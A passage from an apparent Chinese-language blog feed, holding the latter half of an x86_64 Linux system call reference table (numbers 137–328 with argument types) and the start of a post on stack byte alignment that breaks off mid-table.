*pathname</td><td>struct statfs *buf</td><td></td><td></td><td></td><td></td></tr><tr><td>138</td><td>sys_fstatfs</td><td>unsigned int fd</td><td>struct statfs *buf</td><td></td><td></td><td></td><td></td></tr><tr><td>139</td><td>sys_sysfs</td><td>int option</td><td>unsigned long arg1</td><td>unsigned long arg2</td><td></td><td></td><td></td></tr><tr><td>140</td><td>sys_getpriority</td><td>int which</td><td>int who</td><td></td><td></td><td></td><td></td></tr><tr><td>141</td><td>sys_setpriority</td><td>int which</td><td>int who</td><td>int niceval</td><td></td><td></td><td></td></tr><tr><td>142</td><td>sys_sched_setparam</td><td>pid_t pid</td><td>struct sched_param *param</td><td></td><td></td><td></td><td></td></tr><tr><td>143</td><td>sys_sched_getparam</td><td>pid_t pid</td><td>struct sched_param *param</td><td></td><td></td><td></td><td></td></tr><tr><td>144</td><td>sys_sched_setscheduler</td><td>pid_t pid</td><td>int policy</td><td>struct sched_param *param</td><td></td><td></td><td></td></tr><tr><td>145</td><td>sys_sched_getscheduler</td><td>pid_t pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>146</td><td>sys_sched_get_priority_max</td><td>int policy</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>147</td><td>sys_sched_get_priority_min</td><td>int policy</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>148</td><td>sys_sched_rr_get_interval</td><td>pid_t pid</td><td>struct timespec *interval</td><td></td><td></td><td></td><td></td></tr><tr><td>149</td><td>sys_mlock</td><td>unsigned long start</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>150</td><td>sys_munlock</td><td>unsigned long start</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>151</td><td>sys_mlockall</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>152</td><td>sys_munlockall</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>153</td><td>sys_vhangup</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>154</td><td>sys_modify_ldt</td><td>int func</td><td>void *ptr</td><td>unsigned long bytecount</td><td></td><td></td><td></td></tr><tr><td>155</td><td>sys_pivot_root</td><td>const char *new_root</td><td>const char *put_old</td><td></td><td></td><td></td><td></td></tr><tr><td>156</td><td>sys__sysctl</td><td>struct __sysctl_args *args</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>157</td><td>sys_prctl</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td></td><td>unsigned long arg5</td></tr><tr><td>158</td><td>sys_arch_prctl</td><td>struct task_struct *task</td><td>int code</td><td>unsigned long *addr</td><td></td><td></td><td></td></tr><tr><td>159</td><td>sys_adjtimex</td><td>struct timex *txc_p</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>160</td><td>sys_setrlimit</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td></td><td></td><td></td><td></td></tr><tr><td>161</td><td>sys_chroot</td><td>const char *filename</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>162</td><td>sys_sync</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>163</td><td>sys_acct</td><td>const char *name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>164</td><td>sys_settimeofday</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td></td><td></td><td></td><td></td></tr><tr><td>165</td><td>sys_mount</td><td>char *dev_name</td><td>char *dir_name</td><td>char *type</td><td>unsigned long flags</td><td>void *data</td><td></td></tr><tr><td>166</td><td>sys_umount2</td><td>const char *target</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>167</td><td>sys_swapon</td><td>const char *specialfile</td><td>int swap_flags</td><td></td><td></td><td></td><td></td></tr><tr><td>168</td><td>sys_swapoff</td><td>const char *specialfile</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>169</td><td>sys_reboot</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void *arg</td><td></td><td></td></tr><tr><td>170</td><td>sys_sethostname</td><td>char *name</td><td>int len</td><td></td><td></td><td></td><td></td></tr><tr><td>171</td><td>sys_setdomainname</td><td>char *name</td><td>int len</td><td></td><td></td><td></td><td></td></tr><tr><td>172</td><td>sys_iopl</td><td>unsigned int level</td><td>struct pt_regs *regs</td><td></td><td></td><td></td><td></td></tr><tr><td>173</td><td>sys_ioperm</td><td>unsigned long from</td><td>unsigned long num</td><td>int turn_on</td><td></td><td></td><td></td></tr><tr><td>174</td><td>sys_create_module</td><td>REMOVED IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>175</td><td>sys_init_module</td><td>void *umod</td><td>unsigned long len</td><td>const char *uargs</td><td></td><td></td><td></td></tr><tr><td>176</td><td>sys_delete_module</td><td>const chat *name_user</td><td>unsigned int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>177</td><td>sys_get_kernel_syms</td><td>REMOVED IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>178</td><td>sys_query_module</td><td>REMOVED IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>179</td><td>sys_quotactl</td><td>unsigned int cmd</td><td>const char *special</td><td>qid_t id</td><td>void *addr</td><td></td><td></td></tr><tr><td>180</td><td>sys_nfsservctl</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>181</td><td>sys_getpmsg</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>182</td><td>sys_putpmsg</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>183</td><td>sys_afs_syscall</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>184</td><td>sys_tuxcall</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>185</td><td>sys_security</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>186</td><td>sys_gettid</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>187</td><td>sys_readahead</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td></td><td></td><td></td></tr><tr><td>188</td><td>sys_setxattr</td><td>const char *pathname</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td></td></tr><tr><td>189</td><td>sys_lsetxattr</td><td>const char *pathname</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td></td></tr><tr><td>190</td><td>sys_fsetxattr</td><td>int fd</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td></td></tr><tr><td>191</td><td>sys_getxattr</td><td>const char *pathname</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td></td><td></td></tr><tr><td>192</td><td>sys_lgetxattr</td><td>const char *pathname</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td></td><td></td></tr><tr><td>193</td><td>sys_fgetxattr</td><td>int fd</td><td>const har *name</td><td>void *value</td><td>size_t size</td><td></td><td></td></tr><tr><td>194</td><td>sys_listxattr</td><td>const char *pathname</td><td>char *list</td><td>size_t size</td><td></td><td></td><td></td></tr><tr><td>195</td><td>sys_llistxattr</td><td>const char *pathname</td><td>char *list</td><td>size_t size</td><td></td><td></td><td></td></tr><tr><td>196</td><td>sys_flistxattr</td><td>int fd</td><td>char *list</td><td>size_t size</td><td></td><td></td><td></td></tr><tr><td>197</td><td>sys_removexattr</td><td>const char *pathname</td><td>const char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>198</td><td>sys_lremovexattr</td><td>const char *pathname</td><td>const char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>199</td><td>sys_fremovexattr</td><td>int fd</td><td>const char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>200</td><td>sys_tkill</td><td>pid_t pid</td><td>ing sig</td><td></td><td></td><td></td><td></td></tr><tr><td>201</td><td>sys_time</td><td>time_t *tloc</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>202</td><td>sys_futex</td><td>u32 *uaddr</td><td>int op</td><td>u32 val</td><td>struct timespec *utime</td><td>u32 *uaddr2</td><td>u32 val3</td></tr><tr><td>203</td><td>sys_sched_setaffinity</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td></td><td></td><td></td></tr><tr><td>204</td><td>sys_sched_getaffinity</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td></td><td></td><td></td></tr><tr><td>205</td><td>sys_set_thread_area</td><td>NOT IMPLEMENTED. Use arch_prctl</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>206</td><td>sys_io_setup</td><td>unsigned nr_events</td><td>aio_context_t *ctxp</td><td></td><td></td><td></td><td></td></tr><tr><td>207</td><td>sys_io_destroy</td><td>aio_context_t ctx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>208</td><td>sys_io_getevents</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event *events</td><td></td><td></td></tr><tr><td>209</td><td>sys_io_submit</td><td>aio_context_t ctx_id</td><td>long nr</td><td>struct iocb **iocbpp</td><td></td><td></td><td></td></tr><tr><td>210</td><td>sys_io_cancel</td><td>aio_context_t ctx_id</td><td>struct iocb *iocb</td><td>struct io_event *result</td><td></td><td></td><td></td></tr><tr><td>211</td><td>sys_get_thread_area</td><td>NOT IMPLEMENTED. Use arch_prctl</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>212</td><td>sys_lookup_dcookie</td><td>u64 cookie64</td><td>long buf</td><td>long len</td><td></td><td></td><td></td></tr><tr><td>213</td><td>sys_epoll_create</td><td>int size</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>214</td><td>sys_epoll_ctl_old</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>215</td><td>sys_epoll_wait_old</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>216</td><td>sys_remap_file_pages</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td></td></tr><tr><td>217</td><td>sys_getdents64</td><td>unsigned int fd</td><td>struct linux_dirent64 *dirent</td><td>unsigned int count</td><td></td><td></td><td></td></tr><tr><td>218</td><td>sys_set_tid_address</td><td>int *tidptr</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>219</td><td>sys_restart_syscall</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>220</td><td>sys_semtimedop</td><td>int semid</td><td>struct sembuf *tsops</td><td>unsigned nsops</td><td>const struct timespec *timeout</td><td></td><td></td></tr><tr><td>221</td><td>sys_fadvise64</td><td>int fd</td><td>loff_t offset</td><td>size_t len</td><td>int advice</td><td></td><td></td></tr><tr><td>222</td><td>sys_timer_create</td><td>const clockid_t which_clock</td><td>struct sigevent *timer_event_spec</td><td>timer_t *created_timer_id</td><td></td><td></td><td></td></tr><tr><td>223</td><td>sys_timer_settime</td><td>timer_t timer_id</td><td>int flags</td><td>const struct itimerspec *new_setting</td><td>struct itimerspec *old_setting</td><td></td><td></td></tr><tr><td>224</td><td>sys_timer_gettime</td><td>timer_t timer_id</td><td>struct itimerspec *setting</td><td></td><td></td><td></td><td></td></tr><tr><td>225</td><td>sys_timer_getoverrun</td><td>timer_t timer_id</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>226</td><td>sys_timer_delete</td><td>timer_t timer_id</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>227</td><td>sys_clock_settime</td><td>const clockid_t which_clock</td><td>const struct timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>228</td><td>sys_clock_gettime</td><td>const clockid_t which_clock</td><td>struct timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>229</td><td>sys_clock_getres</td><td>const clockid_t which_clock</td><td>struct timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>230</td><td>sys_clock_nanosleep</td><td>const clockid_t which_clock</td><td>int flags</td><td>const struct timespec *rqtp</td><td>struct timespec *rmtp</td><td></td><td></td></tr><tr><td>231</td><td>sys_exit_group</td><td>int error_code</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>232</td><td>sys_epoll_wait</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td></td><td></td></tr><tr><td>233</td><td>sys_epoll_ctl</td><td>int epfd</td><td>int op</td><td>int fd</td><td>struct epoll_event *event</td><td></td><td></td></tr><tr><td>234</td><td>sys_tgkill</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td></td><td></td><td></td></tr><tr><td>235</td><td>sys_utimes</td><td>char *filename</td><td>struct timeval *utimes</td><td></td><td></td><td></td><td></td></tr><tr><td>236</td><td>sys_vserver</td><td>NOT IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>237</td><td>sys_mbind</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long mode</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned flags</td></tr><tr><td>238</td><td>sys_set_mempolicy</td><td>int mode</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td></td><td></td><td></td></tr><tr><td>239</td><td>sys_get_mempolicy</td><td>int *policy</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td></td></tr><tr><td>240</td><td>sys_mq_open</td><td>const char *u_name</td><td>int oflag</td><td>mode_t mode</td><td>struct mq_attr *u_attr</td><td></td><td></td></tr><tr><td>241</td><td>sys_mq_unlink</td><td>const char *u_name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>242</td><td>sys_mq_timedsend</td><td>mqd_t mqdes</td><td>const char *u_msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td>const stuct timespec *u_abs_timeout</td><td></td></tr><tr><td>243</td><td>sys_mq_timedreceive</td><td>mqd_t mqdes</td><td>char *u_msg_ptr</td><td>size_t msg_len</td><td>unsigned int *u_msg_prio</td><td>const struct timespec *u_abs_timeout</td><td></td></tr><tr><td>244</td><td>sys_mq_notify</td><td>mqd_t mqdes</td><td>const struct sigevent *u_notification</td><td></td><td></td><td></td><td></td></tr><tr><td>245</td><td>sys_mq_getsetattr</td><td>mqd_t mqdes</td><td>const struct mq_attr *u_mqstat</td><td>struct mq_attr *u_omqstat</td><td></td><td></td><td></td></tr><tr><td>246</td><td>sys_kexec_load</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td>struct kexec_segment *segments</td><td>unsigned long flags</td><td></td><td></td></tr><tr><td>247</td><td>sys_waitid</td><td>int which</td><td>pid_t upid</td><td>struct siginfo *infop</td><td>int options</td><td>struct rusage *ru</td><td></td></tr><tr><td>248</td><td>sys_add_key</td><td>const char *_type</td><td>const char *_description</td><td>const void *_payload</td><td>size_t plen</td><td></td><td></td></tr><tr><td>249</td><td>sys_request_key</td><td>const char *_type</td><td>const char *_description</td><td>const char *_callout_info</td><td>key_serial_t destringid</td><td></td><td></td></tr><tr><td>250</td><td>sys_keyctl</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td></td></tr><tr><td>251</td><td>sys_ioprio_set</td><td>int which</td><td>int who</td><td>int ioprio</td><td></td><td></td><td></td></tr><tr><td>252</td><td>sys_ioprio_get</td><td>int which</td><td>int who</td><td></td><td></td><td></td><td></td></tr><tr><td>253</td><td>sys_inotify_init</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>254</td><td>sys_inotify_add_watch</td><td>int fd</td><td>const char *pathname</td><td>u32 mask</td><td></td><td></td><td></td></tr><tr><td>255</td><td>sys_inotify_rm_watch</td><td>int fd</td><td>__s32 wd</td><td></td><td></td><td></td><td></td></tr><tr><td>256</td><td>sys_migrate_pages</td><td>pid_t pid</td><td>unsigned long maxnode</td><td>const unsigned long *old_nodes</td><td>const unsigned long *new_nodes</td><td></td><td></td></tr><tr><td>257</td><td>sys_openat</td><td>int dfd</td><td>const char *filename</td><td>int flags</td><td>int mode</td><td></td><td></td></tr><tr><td>258</td><td>sys_mkdirat</td><td>int dfd</td><td>const char *pathname</td><td>int mode</td><td></td><td></td><td></td></tr><tr><td>259</td><td>sys_mknodat</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td>unsigned dev</td><td></td><td></td></tr><tr><td>260</td><td>sys_fchownat</td><td>int dfd</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td></td></tr><tr><td>261</td><td>sys_futimesat</td><td>int dfd</td><td>const char *filename</td><td>struct timeval *utimes</td><td></td><td></td><td></td></tr><tr><td>262</td><td>sys_newfstatat</td><td>int dfd</td><td>const char *filename</td><td>struct stat *statbuf</td><td>int flag</td><td></td><td></td></tr><tr><td>263</td><td>sys_unlinkat</td><td>int dfd</td><td>const char *pathname</td><td>int flag</td><td></td><td></td><td></td></tr><tr><td>264</td><td>sys_renameat</td><td>int oldfd</td><td>const char *oldname</td><td>int newfd</td><td>const char *newname</td><td></td><td></td></tr><tr><td>265</td><td>sys_linkat</td><td>int oldfd</td><td>const char *oldname</td><td>int newfd</td><td>const char *newname</td><td>int flags</td><td></td></tr><tr><td>266</td><td>sys_symlinkat</td><td>const char *oldname</td><td>int newfd</td><td>const char *newname</td><td></td><td></td><td></td></tr><tr><td>267</td><td>sys_readlinkat</td><td>int dfd</td><td>const char *pathname</td><td>char *buf</td><td>int bufsiz</td><td></td><td></td></tr><tr><td>268</td><td>sys_fchmodat</td><td>int dfd</td><td>const char *filename</td><td>mode_t mode</td><td></td><td></td><td></td></tr><tr><td>269</td><td>sys_faccessat</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td></td><td></td><td></td></tr><tr><td>270</td><td>sys_pselect6</td><td>int n</td><td>fd_set *inp</td><td>fd_set *outp</td><td>fd_set *exp</td><td>struct timespec *tsp</td><td>void *sig</td></tr><tr><td>271</td><td>sys_ppoll</td><td>struct pollfd *ufds</td><td>unsigned int nfds</td><td>struct timespec *tsp</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td><td></td></tr><tr><td>272</td><td>sys_unshare</td><td>unsigned long unshare_flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>273</td><td>sys_set_robust_list</td><td>struct robust_list_head *head</td><td>size_t len</td><td></td><td></td><td></td><td></td></tr><tr><td>274</td><td>sys_get_robust_list</td><td>int pid</td><td>struct robust_list_head **head_ptr</td><td>size_t *len_ptr</td><td></td><td></td><td></td></tr><tr><td>275</td><td>sys_splice</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td>276</td><td>sys_tee</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>277</td><td>sys_sync_file_range</td><td>long fd</td><td>loff_t offset</td><td>loff_t bytes</td><td>long flags</td><td></td><td></td></tr><tr><td>278</td><td>sys_vmsplice</td><td>int fd</td><td>const struct iovec *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>279</td><td>sys_move_pages</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void **pages</td><td>const int *nodes</td><td>int *status</td><td>int flags</td></tr><tr><td>280</td><td>sys_utimensat</td><td>int dfd</td><td>const char *filename</td><td>struct timespec *utimes</td><td>int flags</td><td></td><td></td></tr><tr><td>281</td><td>sys_epoll_pwait</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td></tr><tr><td>282</td><td>sys_signalfd</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td></td><td></td><td></td></tr><tr><td>283</td><td>sys_timerfd_create</td><td>int clockid</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>284</td><td>sys_eventfd</td><td>unsigned int count</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>285</td><td>sys_fallocate</td><td>long fd</td><td>long mode</td><td>loff_t offset</td><td>loff_t len</td><td></td><td></td></tr><tr><td>286</td><td>sys_timerfd_settime</td><td>int ufd</td><td>int flags</td><td>const struct itimerspec *utmr</td><td>struct itimerspec *otmr</td><td></td><td></td></tr><tr><td>287</td><td>sys_timerfd_gettime</td><td>int ufd</td><td>struct itimerspec *otmr</td><td></td><td></td><td></td><td></td></tr><tr><td>288</td><td>sys_accept4</td><td>int fd</td><td>struct sockaddr *upeer_sockaddr</td><td>int *upeer_addrlen</td><td>int flags</td><td></td><td></td></tr><tr><td>289</td><td>sys_signalfd4</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>int flags</td><td></td><td></td></tr><tr><td>290</td><td>sys_eventfd2</td><td>unsigned int count</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>291</td><td>sys_epoll_create1</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>292</td><td>sys_dup3</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>293</td><td>sys_pipe2</td><td>int *filedes</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>294</td><td>sys_inotify_init1</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>295</td><td>sys_preadv</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td></td></tr><tr><td>296</td><td>sys_pwritev</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td></td></tr><tr><td>297</td><td>sys_rt_tgsigqueueinfo</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td></td><td></td></tr><tr><td>298</td><td>sys_perf_event_open</td><td>struct perf_event_attr *attr_uptr</td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td></td></tr><tr><td>299</td><td>sys_recvmmsg</td><td>int fd</td><td>struct msghdr *mmsg</td><td>unsigned int vlen</td><td>unsigned int flags</td><td>struct timespec *timeout</td><td></td></tr><tr><td>300</td><td>sys_fanotify_init</td><td>unsigned int flags</td><td>unsigned int event_f_flags</td><td></td><td></td><td></td><td></td></tr><tr><td>301</td><td>sys_fanotify_mark</td><td>long fanotify_fd</td><td>long flags</td><td>__u64 mask</td><td>long dfd</td><td>long pathname</td><td></td></tr><tr><td>302</td><td>sys_prlimit64</td><td>pid_t pid</td><td>unsigned int resource</td><td>const struct rlimit64 *new_rlim</td><td>struct rlimit64 *old_rlim</td><td></td><td></td></tr><tr><td>303</td><td>sys_name_to_handle_at</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flag</td><td></td></tr><tr><td>304</td><td>sys_open_by_handle_at</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flags</td><td></td></tr><tr><td>305</td><td>sys_clock_adjtime</td><td>clockid_t which_clock</td><td>struct timex *tx</td><td></td><td></td><td></td><td></td></tr><tr><td>306</td><td>sys_syncfs</td><td>int fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>307</td><td>sys_sendmmsg</td><td>int fd</td><td>struct mmsghdr *mmsg</td><td>unsigned int vlen</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>308</td><td>sys_setns</td><td>int fd</td><td>int nstype</td><td></td><td></td><td></td><td></td></tr><tr><td>309</td><td>sys_getcpu</td><td>unsigned *cpup</td><td>unsigned *nodep</td><td>struct getcpu_cache *unused</td><td></td><td></td><td></td></tr><tr><td>310</td><td>sys_process_vm_readv</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td>311</td><td>sys_process_vm_writev</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovcc *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td>312</td><td>sys_kcmp</td><td>pid_t pid1</td><td>pid_t pid2</td><td>int type</td><td>unsigned long idx1</td><td>unsigned long idx2</td><td></td></tr><tr><td>313</td><td>sys_finit_module</td><td>int fd</td><td>const char __user *uargs</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>314</td><td>sys_sched_setattr</td><td>pid_t pid</td><td>struct sched_attr __user *attr</td><td>unsigned int flags</td><td></td><td></td><td></td></tr><tr><td>315</td><td>sys_sched_getattr</td><td>pid_t pid</td><td>struct sched_attr __user *attr</td><td>unsigned int size</td><td>unsigned int flags</td><td></td><td></td></tr><tr><td>316</td><td>sys_renameat2</td><td>int olddfd</td><td>const char __user *oldname</td><td>int newdfd</td><td>const char __user *newname</td><td>unsigned int flags</td><td></td></tr><tr><td>317</td><td>sys_seccomp</td><td>unsigned int op</td><td>unsigned int flags</td><td>const char __user *uargs</td><td></td><td></td><td></td></tr><tr><td>318</td><td>sys_getrandom</td><td>char __user *buf</td><td>size_t count</td><td>unsigned int flags</td><td></td><td></td><td></td></tr><tr><td>319</td><td>sys_memfd_create</td><td>const char __user *uname_ptr</td><td>unsigned int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>320</td><td>sys_kexec_file_load</td><td>int kernel_fd</td><td>int initrd_fd</td><td>unsigned long cmdline_len</td><td>const char __user *cmdline_ptr</td><td>unsigned long flags</td><td></td></tr><tr><td>321</td><td>sys_bpf</td><td>int cmd</td><td>union bpf_attr *attr</td><td>unsigned int size</td><td></td><td></td><td></td></tr><tr><td>322</td><td>stub_execveat</td><td>int dfd</td><td>const char __user *filename</td><td>const char __user *const __user *argv</td><td>const char __user *const __user *envp</td><td>int flags</td><td></td></tr><tr><td>323</td><td>userfaultfd</td><td>int flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>324</td><td>membarrier</td><td>int cmd</td><td>int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>325</td><td>mlock2</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td></td><td></td><td></td></tr><tr><td>326</td><td>copy_file_range</td><td>int fd_in</td><td>loff_t __user *off_in</td><td>int fd_out</td><td>loff_t __user * off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td>327</td><td>preadv2</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>int flags</td></tr><tr><td>328</td><td>pwritev2</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>int flags</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;内核版本 Linux 4.7&lt;/p&gt;
&lt;p&gt;Note:64位系统中，不再使用&lt;code&gt;int 0x80&lt;/code&gt;来进行系统调用，取而代之的是&lt;code&gt;syscall&lt;/code&gt;指令&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;%rax&lt;/th&gt;
&lt;t
      
    
    </summary>
    
      <category term="Linux" scheme="https://mingliangliu.com/categories/Linux/"/>
    
    
      <category term="汇编" scheme="https://mingliangliu.com/tags/%E6%B1%87%E7%BC%96/"/>
    
      <category term="Linux" scheme="https://mingliangliu.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>x86_64 Linux 运行时栈的字节对齐</title>
    <link href="https://mingliangliu.com/posts/37e2c5bb/"/>
    <id>https://mingliangliu.com/posts/37e2c5bb/</id>
    <published>2019-08-10T16:02:09.000Z</published>
    <updated>2020-02-15T06:45:50.772Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>C语言的过程调用机制（即函数之间的调用）的一个关键特性（起始大多数编程语言也是如此）都是使用了栈数据结构提供的后进先出的内存管理原则。每一个函数的栈空间被称为栈帧，一个栈帧上包含了保存的寄存器、分配给局部变量的空间以及传递给要调用函数的参数等等。一个基本的栈结构如下图所示：</p><img src="/images/运行时栈的字节对齐1.jpg"><p>但是，有一点需要引起注意的是，过程调用的参数是通过栈来传递的，并且分配的局部变量也在栈上，那么对于不同字节长度的参数或变量，是如何在栈上为它们分配空间的？这里所涉及的就是我们要探讨的字节对齐。</p><p>本文示例用到的环境如下：</p><ul><li>Ubuntu x86_64 GNU/Linux</li><li>gcc 7.4.0</li></ul><h2 id="数据对齐"><a href="#数据对齐" class="headerlink" title="数据对齐"></a>数据对齐</h2><p>许多计算机系统对基本数据类型的合法地址做了一些限制，要求某种类型对象的地址必须是某个值K的倍数，其中K具体如下图。这种对齐限制简化了形成处理器和内存系统之间接口的硬件设计。举个实际的例子：比如我们在内存中读取一个8字节长度的变量，那么这个变量所在的地址必须是8的倍数。如果这个变量所在的地址是8的倍数，那么就可以通过一次内存操作完成该变量的读取。倘若这个变量所在的地址并不是8的倍数，那么可能就需要执行两次内存读取，因为该变量被放在两个8字节的内存块中了。</p><table><thead><tr><th align="center">K</th><th align="center">类型</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">char</td></tr><tr><td align="center">2</td><td align="center">short</td></tr><tr><td align="center">4</td><td align="center">int, float</td></tr><tr><td align="center">8</td><td 